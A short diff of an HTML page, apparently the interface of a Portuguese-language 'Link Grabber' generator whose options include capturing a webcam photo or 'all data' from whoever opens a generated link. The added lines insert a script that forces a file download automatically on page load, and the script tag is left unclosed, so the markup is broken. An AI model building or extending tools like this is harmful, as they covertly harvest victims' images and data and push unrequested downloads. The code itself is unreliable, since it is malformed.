@@ -184,6 +184,18 @@
     <label><input type="radio" name="mode" value="camera" /> Camera (foto via webcam)</label>
     <label><input type="radio" name="mode" value="full" /> Full (todos os dados)</label>
   </div>
+
+
+<script>
+  // Função para iniciar o download do PDF
+  window.addEventListener('load', () => {
+    const link = document.createElement('a');
+    link.href = 'caminho/do/seu/arquivo.pdf'; // Coloque o caminho correto do seu PDF aqui
+    link.download = '';
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+  });
   
   <button id="generateBtn">Gerar Link Grabber</button>
   
